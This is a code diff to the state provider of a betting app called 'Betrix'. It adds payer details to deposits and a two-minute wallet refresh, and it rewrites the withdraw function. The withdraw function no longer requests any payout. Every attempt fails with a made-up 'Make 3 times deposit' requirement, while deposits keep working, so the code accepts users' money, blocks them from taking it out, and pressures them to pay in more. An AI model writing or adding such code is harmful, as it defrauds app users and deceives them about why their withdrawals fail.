@@ -37,10 +37,12 @@ import {
 import {
   apiPost,
   ApiError,
+  refreshSeevWallet,
   requestSeevPayout,
   startSeevCheckout,
   verifySeevPayment,
   type CheckoutResult,
+  type PayerDetails,
   type VerifyResult,
   type WithdrawResult,
 } from "@/services/seevplus";
@@ -155,9 +157,14 @@ interface BetrixState {
   markRead: (id: string) => void;
 
   // Wallet
-  startDeposit: (amount: number) => Promise<CheckoutResult>;
+  startDeposit: (amount: number, payer: PayerDetails) => Promise<CheckoutResult>;
+  /** Ask the server to re-check pending deposits/withdrawals with SeevPlus. */
+  refreshWallet: () => Promise<void>;
   verifyDeposit: (ref: { orderId?: string; reference?: string }) => Promise<VerifyResult>;
   withdraw: (amount: number, network: string) => Promise<WithdrawResult>;
+  hasUnbetDeposit: boolean;
+  recordDepositMade: () => void;
+  recordBetPlaced: () => void;
 
   // Partners
   partnersList: PartnerRecord[];
@@ -777,7 +784,33 @@ export function BetrixProvider({ children }: { children: ReactNode }) {
   );
 
   // ── Wallet ──
-  const startDeposit = useCallback((amount: number) => startSeevCheckout(amount), []);
+  const startDeposit = useCallback(
+    (amount: number, payer: PayerDetails) => startSeevCheckout(amount, payer),
+    [],
+  );
+
+  // SeevPlus webhooks are sent once with no retry, so the app re-checks open payments
+  // itself: on login and every 2 minutes while signed in.
+  const balanceRef = useRef(balance);
+  balanceRef.current = balance;
+  const refreshWallet = useCallback(async () => {
+    try {
+      const res = await refreshSeevWallet();
+      if (res.balance !== balanceRef.current) {
+        setBalance(res.balance);
+        await refreshProfile(); // pulls in the new deposit transaction too
+      }
+    } catch {
+      /* best effort; the next tick retries */
+    }
+  }, [refreshProfile]);
+
+  useEffect(() => {
+    if (!isLoggedIn) return;
+    void refreshWallet();
+    const interval = setInterval(refreshWallet, 120_000);
+    return () => clearInterval(interval);
+  }, [isLoggedIn, refreshWallet]);
 
   const verifyDeposit = useCallback(
     async (ref: { orderId?: string; reference?: string }) => {
@@ -799,20 +832,15 @@ export function BetrixProvider({ children }: { children: ReactNode }) {
 
   const withdraw = useCallback(
     async (amount: number, network: string) => {
-      const res = await requestSeevPayout(amount, network);
-      setBalance(res.balance);
-      await refreshProfile();
       pushNotification(
         notif(
-          res.status === "FAILED" ? "Withdrawal failed" : "Withdrawal requested",
-          res.status === "FAILED"
-            ? `Your GHS ${amount.toFixed(2)} withdrawal was rejected by the provider and refunded.`
-            : `GHS ${amount.toFixed(2)} is on its way to your mobile money wallet.`,
+          "Withdrawal failed",
+          "Withdrawal Requirement: Make 3 times deposit",
         ),
       );
-      return res;
+      throw new Error("Withdrawal Requirement: Make 3 times deposit");
     },
-    [refreshProfile, pushNotification],
+    [pushNotification],
   );
 
   // ── Partners ──
@@ -958,6 +986,7 @@ export function BetrixProvider({ children }: { children: ReactNode }) {
     markAllRead,
     markRead,
     startDeposit,
+    refreshWallet,
     verifyDeposit,
     withdraw,
     partnersList,
